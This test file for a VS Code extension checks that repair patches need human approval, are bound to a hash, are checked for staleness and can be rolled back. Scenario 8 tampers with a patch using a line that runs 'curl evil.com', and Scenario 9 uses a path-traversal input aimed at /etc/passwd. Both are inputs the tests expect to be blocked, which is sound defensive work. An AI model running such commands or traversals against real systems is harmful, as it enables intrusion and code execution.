const test = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");
const os = require("node:os");
const http = require("node:http");
const Module = require("node:module");

// Setup lightweight vscode mock for Node test runner
const mockConfigStore = new Map([
  ["dependencyGuardian.backendUrl", "http://localhost:8000"],
  ["dependencyGuardian.projectId", "proj_test_123"],
  ["dependencyGuardian.autoSyncBackend", true],
  ["dependencyGuardian.detectionMode", "hybrid"],
]);

const mockVscode = {
  ViewColumn: { One: 1, Two: 2 },
  Uri: {
    file: (p) => ({ fsPath: p, toString: () => `file://${p}` }),
    parse: (u) => ({ fsPath: u, toString: () => u }),
  },
  ConfigurationTarget: {
    Global: 1,
    Workspace: 2,
    WorkspaceFolder: 3,
  },
  window: {
    createOutputChannel: () => ({
      append: () => {},
      appendLine: () => {},
      show: () => {},
      dispose: () => {},
    }),
    showInformationMessage: () => Promise.resolve(undefined),
    showWarningMessage: () => Promise.resolve(undefined),
    showErrorMessage: () => Promise.resolve(undefined),
    createWebviewPanel: (viewType, title, showOptions, options) => {
      let htmlContent = "";
      const messageListeners = [];
      return {
        viewType,
        title,
        options,
        reveal: () => {},
        dispose: () => {},
        onDidDispose: () => ({ dispose: () => {} }),
        webview: {
          options: {},
          set html(val) {
            htmlContent = val;
          },
          get html() {
            return htmlContent;
          },
          postMessage: () => Promise.resolve(true),
          onDidReceiveMessage: (fn) => {
            messageListeners.push(fn);
            return { dispose: () => {} };
          },
        },
      };
    },
  },
  workspace: {
    workspaceFolders: [{ uri: { fsPath: path.resolve(__dirname, "..", "..") } }],
    getConfiguration: (section) => ({
      get: (key, def) => {
        const fullKey = section ? `${section}.${key}` : key;
        return mockConfigStore.has(fullKey) ? mockConfigStore.get(fullKey) : def;
      },
      update: (key, val) => {
        const fullKey = section ? `${section}.${key}` : key;
        mockConfigStore.set(fullKey, val);
        return Promise.resolve();
      },
    }),
  },
};

// Patch module loader to provide mock vscode
const originalRequire = Module.prototype.require;
Module.prototype.require = function (id) {
  if (id === "vscode") return mockVscode;
  return originalRequire.apply(this, arguments);
};

const {
  patchIntegrityStore,
  validateWorkspacePath,
  computeCanonicalPatchHash,
  computeFileHash,
  extractChangeSet,
} = require("../dist/patchIntegrity");
const { GuardianClient } = require("../dist/api/guardianClient");
const { GuardianDashboardPanel } = require("../dist/webview/guardianPanel");

function createTempDir(prefix = "guardian-test-") {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

test.describe("Repair Approval Flow and Git-Style Diff Review Suite", () => {
  test.beforeEach(() => {
    patchIntegrityStore.clear();
  });

  // --------------------------------------------------------------------------
  // Scenario 1: Proposed repair cannot be applied (Apply rejected/disabled)
  // --------------------------------------------------------------------------
  test.it("Scenario 1: Proposed repair cannot be applied before explicit approval", () => {
    const tempDir = createTempDir("scen1-");
    try {
      const srcFile = path.join(tempDir, "payment.py");
      fs.writeFileSync(srcFile, "def pay():\n    return req.amount\n", "utf-8");

      const proposal = {
        id: "1dd062d0-d863-45fc-bf83-607f9411dc7c",
        change_id: "chg_scen1",
        repair_type: "compatibility_adapter",
        target_file: "payment.py",
        original_code_snippet: "return req.amount",
        proposed_code_snippet: "return {'amount': req.amount}",
        diff: "--- a/payment.py\n+++ b/payment.py\n@@ -2,1 +2,1 @@\n-    return req.amount\n+    return {'amount': req.amount}\n",
        evidence: {
          file_changes: [
            {
              file_path: "payment.py",
              original_content: "def pay():\n    return req.amount\n",
              proposed_content: "def pay():\n    return {'amount': req.amount}\n",
            },
          ],
        },
        assumptions: [],
        confidence: 0.95,
        status: "proposed", // NOT approved!
        created_at: new Date().toISOString(),
      };

      // 1. Review proposal
      patchIntegrityStore.recordReview(proposal, tempDir);

      // 2. Direct apply verification MUST fail because status is 'proposed', not 'approved'
      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, false);
      assert.match(verification.reason, /has not received human approval/i);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 2: Approval persists on backend, updates status to 'approved', then permits application
  // --------------------------------------------------------------------------
  test.it("Scenario 2: Approval updates status to approved, binds patch hash, and enables safe application", async () => {
    const tempDir = createTempDir("scen2-");
    let serverReceivedApproval = false;
    let serverReceivedApply = false;

    // Start a mock backend server to verify actual HTTP protocol
    const server = http.createServer((req, res) => {
      const url = req.url || "";
      if (req.method === "POST" && (url.includes("/approvals") || url.includes("/approve"))) {
        serverReceivedApproval = true;
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ status: "approved", proposal_id: "prop_scen2", reviewer_id: "vscode-developer" }));
      } else if (req.method === "GET" && url.includes("/repair-proposals/prop_scen2")) {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({
          id: "prop_scen2",
          incident_id: "chg_scen2",
          status: serverReceivedApproval ? "approved" : "proposed",
          rationale: "adapter",
          strategy: "compatibility_adapter",
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString(),
        }));
      } else if (req.method === "POST" && (url.includes("/applications") || url.includes("/apply"))) {
        serverReceivedApply = true;
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ status: "applied", proposal_id: "prop_scen2" }));
      } else {
        res.writeHead(404);
        res.end();
      }
    });

    await new Promise((resolve) => server.listen(0, resolve));
    const port = server.address().port;
    const client = new GuardianClient(`http://127.0.0.1:${port}`);

    try {
      const srcFile = path.join(tempDir, "handler.py");
      fs.writeFileSync(srcFile, "def handler(): return 1\n", "utf-8");

      const proposal = {
        id: "prop_scen2",
        change_id: "chg_scen2",
        repair_type: "compatibility_adapter",
        target_file: "handler.py",
        original_code_snippet: "def handler(): return 1\n",
        proposed_code_snippet: "def handler(): return 2\n",
        diff: "--- a/handler.py\n+++ b/handler.py\n@@ -1 +1 @@\n-def handler(): return 1\n+def handler(): return 2\n",
        evidence: {
          file_changes: [
            {
              file_path: "handler.py",
              original_content: "def handler(): return 1\n",
              proposed_content: "def handler(): return 2\n",
            },
          ],
        },
        assumptions: [],
        confidence: 0.99,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      // 1. Review
      const reviewRecord = patchIntegrityStore.recordReview(proposal, tempDir);
      assert.ok(reviewRecord.isDiffReviewed);

      // 2. Client calls backend approval
      const approvalRes = await client.approveRepair(proposal.id, "vscode-developer", `Approved: ${reviewRecord.patchHash}`);
      assert.strictEqual(approvalRes.status, "approved");
      assert.strictEqual(serverReceivedApproval, true);

      // 3. Local record approval
      const approvedHash = patchIntegrityStore.recordApproval(proposal.id);
      assert.strictEqual(approvedHash, reviewRecord.patchHash);

      // 4. Update proposal status to approved
      proposal.status = "approved";

      // 5. Verification passes
      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, true);
      assert.strictEqual(verification.approvedHash, approvedHash);

      // 6. Safe application
      const applied = patchIntegrityStore.applyApprovedChangesSafely(verification.changes, tempDir, proposal.id);
      assert.strictEqual(applied.length, 1);
      assert.strictEqual(fs.readFileSync(srcFile, "utf-8"), "def handler(): return 2\n");

      // 7. Backend application record
      const applyRes = await client.applyRepair(proposal.id, "vscode-developer", "applied", tempDir, "Patch applied");
      assert.strictEqual(applyRes.status, "applied");
      assert.strictEqual(serverReceivedApply, true);
    } finally {
      server.close();
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 3: Failed approval leaves Apply disabled
  // --------------------------------------------------------------------------
  test.it("Scenario 3: Failed backend approval revokes local record and blocks application", async () => {
    const tempDir = createTempDir("scen3-");
    const server = http.createServer((req, res) => {
      // Return 500 error on approval endpoint
      res.writeHead(500, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ detail: "Database connection failed during approval" }));
    });

    await new Promise((resolve) => server.listen(0, resolve));
    const port = server.address().port;
    const client = new GuardianClient(`http://127.0.0.1:${port}`);

    try {
      const srcFile = path.join(tempDir, "auth.py");
      fs.writeFileSync(srcFile, "def check(): pass\n", "utf-8");

      const proposal = {
        id: "prop_scen3",
        change_id: "chg_scen3",
        repair_type: "compatibility_adapter",
        target_file: "auth.py",
        original_code_snippet: "pass",
        proposed_code_snippet: "return True",
        diff: "diff",
        evidence: {
          file_changes: [{ file_path: "auth.py", original_content: "def check(): pass\n", proposed_content: "def check(): return True\n" }],
        },
        assumptions: [],
        confidence: 0.9,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      patchIntegrityStore.recordReview(proposal, tempDir);

      // Backend approval fails
      await assert.rejects(
        async () => {
          await client.approveRepair(proposal.id, "vscode-developer");
        },
        /Database connection failed/i
      );

      // Local revocation
      patchIntegrityStore.revokeApproval(proposal.id);

      // Application verification must fail
      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, false);
      assert.match(verification.reason, /has not received human approval/i);
    } finally {
      server.close();
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 4: Rejection persists status 'rejected' and blocks application
  // --------------------------------------------------------------------------
  test.it("Scenario 4: Rejection persists status 'rejected' with reviewer_id and reason, revoking approval", async () => {
    const tempDir = createTempDir("scen4-");
    let receivedPayload = null;

    const server = http.createServer((req, res) => {
      const url = req.url || "";
      if (req.method === "POST" && (url.includes("/reject") || url.includes("/repair-proposals/"))) {
        let body = "";
        req.on("data", (chunk) => { body += chunk; });
        req.on("end", () => {
          receivedPayload = JSON.parse(body);
          res.writeHead(200, { "Content-Type": "application/json" });
          res.end(JSON.stringify({ status: "rejected", proposal_id: "prop_scen4", reviewer_id: receivedPayload.reviewer_id, reason: receivedPayload.reason }));
        });
      } else {
        res.writeHead(404);
        res.end();
      }
    });

    await new Promise((resolve) => server.listen(0, resolve));
    const port = server.address().port;
    const client = new GuardianClient(`http://127.0.0.1:${port}`);

    try {
      const srcFile = path.join(tempDir, "api.py");
      fs.writeFileSync(srcFile, "def get(): return 1\n", "utf-8");

      const proposal = {
        id: "prop_scen4",
        change_id: "chg_scen4",
        repair_type: "compatibility_adapter",
        target_file: "api.py",
        original_code_snippet: "1",
        proposed_code_snippet: "2",
        diff: "diff",
        evidence: {
          file_changes: [{ file_path: "api.py", original_content: "def get(): return 1\n", proposed_content: "def get(): return 2\n" }],
        },
        assumptions: [],
        confidence: 0.8,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      patchIntegrityStore.recordReview(proposal, tempDir);
      patchIntegrityStore.recordApproval(proposal.id);

      // Developer rejects proposal
      const rejectRes = await client.rejectRepair(proposal.id, "senior-dev", "Breaks downstream consumers");
      assert.strictEqual(rejectRes.status, "rejected");
      assert.strictEqual(receivedPayload.reviewer_id, "senior-dev");
      assert.strictEqual(receivedPayload.reason, "Breaks downstream consumers");

      // Approval is revoked
      patchIntegrityStore.revokeApproval(proposal.id);
      proposal.status = "rejected";

      // Application must be blocked
      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, false);
      assert.match(verification.reason, /has not received human approval/i);
    } finally {
      server.close();
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 5: Displayed diff matches exact approved patch
  // --------------------------------------------------------------------------
  test.it("Scenario 5: Extracted change set matches canonical hash bound to approval", () => {
    const tempDir = createTempDir("scen5-");
    try {
      const proposal = {
        id: "prop_scen5",
        change_id: "chg_scen5",
        repair_type: "compatibility_adapter",
        target_file: "service.py",
        original_code_snippet: "old_code()",
        proposed_code_snippet: "new_code()",
        diff: "diff",
        evidence: {
          file_changes: [
            {
              file_path: "src/service.py",
              original_content: "def run():\n    old_code()\n",
              proposed_content: "def run():\n    new_code()\n",
            },
          ],
        },
        assumptions: [],
        confidence: 0.95,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      const changeSet = extractChangeSet(proposal, tempDir);
      assert.strictEqual(changeSet.length, 1);
      assert.strictEqual(changeSet[0].relativePath, "src/service.py");
      assert.strictEqual(changeSet[0].proposedContent, "def run():\n    new_code()\n");

      const computedHash = computeCanonicalPatchHash(changeSet);
      patchIntegrityStore.recordReview(proposal, tempDir);
      const approvedHash = patchIntegrityStore.recordApproval(proposal.id);

      assert.strictEqual(approvedHash, computedHash);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 6: Multi-file diff displays correct relative paths and aligned contents
  // --------------------------------------------------------------------------
  test.it("Scenario 6: Multi-file changes normalize relative paths and compute deterministic hash", () => {
    const tempDir = createTempDir("scen6-");
    try {
      const file1 = path.join(tempDir, "pkg", "routes.py");
      const file2 = path.join(tempDir, "pkg", "models.py");
      fs.mkdirSync(path.join(tempDir, "pkg"), { recursive: true });
      fs.writeFileSync(file1, "route_v1\n", "utf-8");
      fs.writeFileSync(file2, "model_v1\n", "utf-8");

      const proposal = {
        id: "prop_scen6",
        change_id: "chg_scen6",
        repair_type: "multi_file_patch",
        target_file: "pkg/routes.py",
        original_code_snippet: "",
        proposed_code_snippet: "",
        diff: "diff",
        evidence: {
          file_changes: [
            { file_path: "pkg/models.py", original_content: "model_v1\n", proposed_content: "model_v2\n" },
            { file_path: "pkg/routes.py", original_content: "route_v1\n", proposed_content: "route_v2\n" },
          ],
        },
        assumptions: [],
        confidence: 0.95,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      const changes = extractChangeSet(proposal, tempDir);
      assert.strictEqual(changes.length, 2);
      assert.strictEqual(changes[0].relativePath, "pkg/models.py");
      assert.strictEqual(changes[1].relativePath, "pkg/routes.py");

      const reviewRecord = patchIntegrityStore.recordReview(proposal, tempDir);
      assert.strictEqual(reviewRecord.fileChanges.length, 2);
      assert.ok(reviewRecord.originalFileHashes["pkg/models.py"]);
      assert.ok(reviewRecord.originalFileHashes["pkg/routes.py"]);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 7: Source file hash modification causes stale-proposal error
  // --------------------------------------------------------------------------
  test.it("Scenario 7: Modification of target source file on disk marks proposal stale", () => {
    const tempDir = createTempDir("scen7-");
    try {
      const srcFile = path.join(tempDir, "app.py");
      fs.writeFileSync(srcFile, "original_content\n", "utf-8");

      const proposal = {
        id: "prop_scen7",
        change_id: "chg_scen7",
        repair_type: "compatibility_adapter",
        target_file: "app.py",
        original_code_snippet: "original_content",
        proposed_code_snippet: "patched_content",
        diff: "diff",
        evidence: {
          file_changes: [{ file_path: "app.py", original_content: "original_content\n", proposed_content: "patched_content\n" }],
        },
        assumptions: [],
        confidence: 0.95,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      // Review when file is at 'original_content'
      patchIntegrityStore.recordReview(proposal, tempDir);

      let staleness = patchIntegrityStore.checkProposalStaleness(proposal, tempDir);
      assert.strictEqual(staleness.isStale, false);

      // Now external edit occurs to app.py
      fs.writeFileSync(srcFile, "modified_externally_content\n", "utf-8");

      // Staleness check must detect modification
      staleness = patchIntegrityStore.checkProposalStaleness(proposal, tempDir);
      assert.strictEqual(staleness.isStale, true);
      assert.match(staleness.reason, /was modified on disk/i);

      // Application verification must also abort with stale error
      patchIntegrityStore.recordApproval(proposal.id);
      proposal.status = "approved";
      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, false);
      assert.match(verification.reason, /Conflict detected/i);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 8: Patch tampering after approval is rejected
  // --------------------------------------------------------------------------
  test.it("Scenario 8: Tampering with proposed patch after approval is detected and rejected", () => {
    const tempDir = createTempDir("scen8-");
    try {
      const srcFile = path.join(tempDir, "calc.py");
      fs.writeFileSync(srcFile, "def add(a, b): return a + b\n", "utf-8");

      const proposal = {
        id: "prop_scen8",
        change_id: "chg_scen8",
        repair_type: "compatibility_adapter",
        target_file: "calc.py",
        original_code_snippet: "return a + b",
        proposed_code_snippet: "return int(a) + int(b)",
        diff: "diff",
        evidence: {
          file_changes: [
            { file_path: "calc.py", original_content: "def add(a, b): return a + b\n", proposed_content: "def add(a, b): return int(a) + int(b)\n" },
          ],
        },
        assumptions: [],
        confidence: 0.95,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      patchIntegrityStore.recordReview(proposal, tempDir);
      patchIntegrityStore.recordApproval(proposal.id);
      proposal.status = "approved";

      // Tamper with proposed content
      proposal.evidence.file_changes[0].proposed_content = "import os; os.system('curl evil.com')\n";

      // Verification MUST reject tampered patch
      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, false);
      assert.match(verification.reason, /Integrity failure/i);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 9: Path traversal and out-of-workspace symlinks rejected
  // --------------------------------------------------------------------------
  test.it("Scenario 9: Path traversal and symlink escapes are detected and rejected", () => {
    const tempDir = createTempDir("scen9-");
    try {
      // Test traversal
      const res1 = validateWorkspacePath(tempDir, "../../../etc/passwd");
      assert.strictEqual(res1.ok, false);
      assert.match(res1.reason, /Path traversal detected/i);

      // Test symlink escape
      const outsideDir = createTempDir("outside-");
      try {
        const linkPath = path.join(tempDir, "link_outside");
        fs.symlinkSync(outsideDir, linkPath);

        const res2 = validateWorkspacePath(tempDir, "link_outside/file.py");
        assert.strictEqual(res2.ok, false);
        assert.match(res2.reason, /Symlink escape detected/i);
      } finally {
        fs.rmSync(outsideDir, { recursive: true, force: true });
      }
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 10: Backend unavailability does not produce fake success
  // --------------------------------------------------------------------------
  test.it("Scenario 10: Backend connection failure produces honest network error without fake success", async () => {
    // Unused port
    const client = new GuardianClient("http://127.0.0.1:59999");
    await assert.rejects(
      async () => {
        await client.getRepair("any_id");
      },
      (err) => {
        assert.ok(err.message.includes("ECONNREFUSED") || err.message.includes("fetch failed") || err.message.includes("failed"));
        return true;
      }
    );
  });

  // --------------------------------------------------------------------------
  // Scenario 11: Applying fails when proposal ID or status is invalid
  // --------------------------------------------------------------------------
  test.it("Scenario 11: Applying fails when proposal ID does not exist in store", () => {
    const tempDir = createTempDir("scen11-");
    try {
      const nonExistentProposal = {
        id: "non_existent_id",
        change_id: "chg_11",
        repair_type: "adapter",
        target_file: "test.py",
        original_code_snippet: "a",
        proposed_code_snippet: "b",
        diff: "diff",
        evidence: {},
        assumptions: [],
        confidence: 0.9,
        status: "approved",
        created_at: new Date().toISOString(),
      };

      const verification = patchIntegrityStore.verifyBeforeApplication(nonExistentProposal, tempDir);
      assert.strictEqual(verification.ok, false);
      assert.match(verification.reason, /has not been reviewed in this session/i);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 12: Successful application writes files, creates .guardian.bak, and rollback restores
  // --------------------------------------------------------------------------
  test.it("Scenario 12: Application writes file, creates persistent .guardian.bak, and rollback restores accurately", () => {
    const tempDir = createTempDir("scen12-");
    try {
      const srcFile = path.join(tempDir, "service.py");
      const originalCode = "def execute():\n    return 'v1'\n";
      fs.writeFileSync(srcFile, originalCode, "utf-8");

      const proposal = {
        id: "prop_scen12",
        change_id: "chg_scen12",
        repair_type: "compatibility_adapter",
        target_file: "service.py",
        original_code_snippet: "v1",
        proposed_code_snippet: "v2",
        diff: "diff",
        evidence: {
          file_changes: [
            { file_path: "service.py", original_content: originalCode, proposed_content: "def execute():\n    return 'v2'\n" },
          ],
        },
        assumptions: [],
        confidence: 0.95,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      patchIntegrityStore.recordReview(proposal, tempDir);
      patchIntegrityStore.recordApproval(proposal.id);
      proposal.status = "approved";

      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, true);

      // Apply changes safely
      const applied = patchIntegrityStore.applyApprovedChangesSafely(verification.changes, tempDir, proposal.id);
      assert.strictEqual(applied.length, 1);
      assert.strictEqual(fs.readFileSync(srcFile, "utf-8"), "def execute():\n    return 'v2'\n");

      // Verify persistent disk backup exists
      const bakFile = `${srcFile}.guardian.bak`;
      assert.strictEqual(fs.existsSync(bakFile), true);
      assert.strictEqual(fs.readFileSync(bakFile, "utf-8"), originalCode);

      // Rollback changes
      const restored = patchIntegrityStore.rollbackAppliedChanges(tempDir, proposal.id);
      assert.strictEqual(restored.length, 1);
      assert.strictEqual(fs.readFileSync(srcFile, "utf-8"), originalCode);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 13: Dashboard Panel HTML verifies Git-style diff review elements
  // --------------------------------------------------------------------------
  test.it("Scenario 13: Webview dashboard panel contains Git-style side-by-side diff review UI", () => {
    GuardianDashboardPanel.currentPanel = undefined;
    const extensionUri = mockVscode.Uri.file("/dummy/ext");
    const client = new GuardianClient("http://localhost:8000");
    GuardianDashboardPanel.createOrShow(extensionUri, client, undefined, undefined, "/dummy/workspace");

    const panel = GuardianDashboardPanel.currentPanel;
    assert.ok(panel, "Current panel should be instantiated");
    const html = panel._panel.webview.html;
    assert.ok(html.includes("diff-review-container"), "Must include .diff-review-container");
    assert.ok(html.includes("diff-split-wrapper"), "Must include .diff-split-wrapper");
    assert.ok(html.includes("diff-pane-left"), "Must include .diff-pane-left");
    assert.ok(html.includes("diff-pane-right"), "Must include .diff-pane-right");
    assert.ok(html.includes("diff-stats-badge"), "Must include .diff-stats-badge");
    assert.ok(html.includes("diff-view-mode-toggle"), "Must include .diff-view-mode-toggle");
    assert.ok(html.includes("parseUnifiedDiff"), "Must include parseUnifiedDiff parser");
    assert.ok(html.includes("renderGitDiffReview"), "Must include renderGitDiffReview function");
    assert.ok(html.includes("openNativeDiff"), "Must include openNativeDiff trigger");
    assert.ok(html.includes("rejectRepair"), "Must include rejectRepair action");
  });

  // --------------------------------------------------------------------------
  // Scenario 14: Webview <script> parses cleanly with zero SyntaxErrors
  // --------------------------------------------------------------------------
  test.it("Scenario 14: Webview <script> evaluates without SyntaxError (no template newline/regex corruption)", () => {
    GuardianDashboardPanel.currentPanel = undefined;
    const extensionUri = mockVscode.Uri.file("/dummy/ext");
    const client = new GuardianClient("http://localhost:8000");
    GuardianDashboardPanel.createOrShow(extensionUri, client, undefined, undefined, "/dummy/workspace");

    const panel = GuardianDashboardPanel.currentPanel;
    const html = panel._panel.webview.html;
    const scriptMatch = html.match(/<script>([\s\S]*?)<\/script>/i);
    assert.ok(scriptMatch, "Webview HTML must contain a <script> block");

    const scriptCode = scriptMatch[1];
    assert.ok(scriptCode.length > 1000, "Script code must be substantial");

    // Must evaluate cleanly in V8
    assert.doesNotThrow(() => {
      new Function(scriptCode);
    }, "Script code must evaluate without throwing SyntaxError");
  });

  // --------------------------------------------------------------------------
  // Scenario 15: Contract Comparison Studio UI and workflow elements exist
  // --------------------------------------------------------------------------
  test.it("Scenario 15: Contract Comparison Studio navigation and controls exist in dashboard HTML", () => {
    GuardianDashboardPanel.currentPanel = undefined;
    const extensionUri = mockVscode.Uri.file("/dummy/ext");
    const client = new GuardianClient("http://localhost:8000");
    GuardianDashboardPanel.createOrShow(extensionUri, client, undefined, undefined, "/dummy/workspace");

    const panel = GuardianDashboardPanel.currentPanel;
    const html = panel._panel.webview.html;

    // Workflow breadcrumb navigation: API Inventory -> Baselines -> Compare
    assert.ok(html.includes("breadcrumb-bar"), "Must contain breadcrumb navigation bar");
    assert.ok(html.includes("1. API Inventory"), "Must include 1. API Inventory");
    assert.ok(html.includes("2. Baselines Reference"), "Must include 2. Baselines Reference");
    assert.ok(html.includes("3. Compare Snapshots"), "Must include 3. Compare Snapshots");

    // Studio controls
    assert.ok(html.includes('id="baselineCompareStudio"'), "Must include comparison studio container");
    assert.ok(html.includes('id="compareBaseSelect"'), "Must include base snapshot select");
    assert.ok(html.includes('id="compareTargetSelect"'), "Must include target snapshot select");
    assert.ok(html.includes('id="btnCompareSnapshots"'), "Must include compare snapshots button");
    assert.ok(html.includes('data-action="executeSelectedCompare"'), "Must have data-action for compare");
    assert.ok(html.includes('id="baselineDiffCard"'), "Must include baseline diff card");
  });

  // --------------------------------------------------------------------------
  // Scenario 16: Global event delegation listener covers all action buttons
  // --------------------------------------------------------------------------
  test.it("Scenario 16: Global event delegation is registered and webviewReady is dispatched", () => {
    GuardianDashboardPanel.currentPanel = undefined;
    const extensionUri = mockVscode.Uri.file("/dummy/ext");
    const client = new GuardianClient("http://localhost:8000");
    GuardianDashboardPanel.createOrShow(extensionUri, client, undefined, undefined, "/dummy/workspace");

    const panel = GuardianDashboardPanel.currentPanel;
    const html = panel._panel.webview.html;

    assert.ok(html.includes("document.addEventListener('click'"), "Must attach global click event delegation");
    assert.ok(html.includes("data-action"), "Must support data-action attribute delegation");
    assert.ok(html.includes("webviewReady"), "Must dispatch webviewReady message on load");
  });

  // --------------------------------------------------------------------------
  // Scenario 17: Proposal ID alias resolution between rep_... and backend UUID
  // --------------------------------------------------------------------------
  test.it("Scenario 17: Resolves client proposal alias (rep_...) to canonical backend UUID", () => {
    const tempDir = createTempDir("scen17-");
    try {
      const canonicalUuid = "1dd062d0-d863-45fc-bf83-607f9411dc7c";
      const clientAlias = "rep_e1184dc5282c";
      const targetFile = path.join(tempDir, "service.py");
      fs.writeFileSync(targetFile, "def handler():\n    return 'old'\n");

      const proposal = {
        id: canonicalUuid,
        change_id: "chg_scen17",
        repair_type: "compatibility_adapter",
        target_file: "service.py",
        original_code_snippet: "return 'old'",
        proposed_code_snippet: "return 'new'",
        diff: "--- service.py\n+++ service.py\n@@ -2,1 +2,1 @@\n- return 'old'\n+ return 'new'",
        proposed_changes: {
          client_repair_id: clientAlias,
          repair_id: clientAlias,
          target_file: "service.py",
          file_changes: [
            {
              file_path: "service.py",
              original_content: "def handler():\n    return 'old'\n",
              proposed_content: "def handler():\n    return 'new'\n",
            },
          ],
        },
        evidence: {},
        assumptions: [],
        confidence: 0.95,
        status: "proposed",
        created_at: new Date().toISOString(),
      };

      // Record review using canonical proposal
      const record = patchIntegrityStore.recordReview(proposal, tempDir);
      assert.strictEqual(record.proposalId, canonicalUuid);

      // Verify that lookup by client alias returns the exact same record
      const recordByAlias = patchIntegrityStore.getRecord(clientAlias);
      assert.ok(recordByAlias, "Must resolve record via client alias ID");
      assert.strictEqual(recordByAlias.proposalId, canonicalUuid);

      // Record approval using client alias
      const approvedHash = patchIntegrityStore.recordApproval(clientAlias);
      assert.strictEqual(approvedHash, record.patchHash);

      // Verify verification passes for canonical proposal
      const verification = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(verification.ok, true);
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });

  // --------------------------------------------------------------------------
  // Scenario 18: Safe human approval binding when proposal is already approved on backend
  // --------------------------------------------------------------------------
  test.it("Scenario 18: Safe human approval binding when proposal is already approved on backend", () => {
    const tempDir = createTempDir("scen18-");
    try {
      const canonicalUuid = "2bb062d0-d863-45fc-bf83-607f9411dc7d";
      const targetFile = path.join(tempDir, "app.py");
      fs.writeFileSync(targetFile, "val = 1\n");

      const proposal = {
        id: canonicalUuid,
        change_id: "chg_scen18",
        repair_type: "compatibility_adapter",
        target_file: "app.py",
        original_code_snippet: "val = 1\n",
        proposed_code_snippet: "val = 2\n",
        diff: "--- app.py\n+++ app.py\n@@ -1,1 +1,1 @@\n- val = 1\n+ val = 2",
        proposed_changes: {
          file_changes: [
            {
              file_path: "app.py",
              original_content: "val = 1\n",
              proposed_content: "val = 2\n",
            },
          ],
        },
        evidence: {},
        assumptions: [],
        confidence: 0.92,
        status: "approved", // already approved on backend
        created_at: new Date().toISOString(),
      };

      // 1. Review diff in current session
      const reviewRecord = patchIntegrityStore.recordReview(proposal, tempDir);
      assert.strictEqual(reviewRecord.isDiffReviewed, true);
      assert.strictEqual(reviewRecord.approvedPatchHash, undefined);

      // 2. Before local approval binding, verifyBeforeApplication rejects
      const preCheck = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(preCheck.ok, false);
      assert.ok(preCheck.reason.includes("has not received human approval"));

      // 3. User grants explicit human approval
      const boundHash = patchIntegrityStore.recordApproval(proposal.id);
      assert.strictEqual(boundHash, reviewRecord.patchHash);

      // 4. Verification now succeeds
      const postCheck = patchIntegrityStore.verifyBeforeApplication(proposal, tempDir);
      assert.strictEqual(postCheck.ok, true);
      assert.strictEqual(postCheck.approvedHash, boundHash);

      // 5. Apply changes safely
      const applied = patchIntegrityStore.applyApprovedChangesSafely(
        postCheck.changes,
        tempDir,
        proposal.id
      );
      assert.strictEqual(applied.length, 1);
      assert.strictEqual(fs.readFileSync(targetFile, "utf-8"), "val = 2\n");
    } finally {
      fs.rmSync(tempDir, { recursive: true, force: true });
    }
  });
});

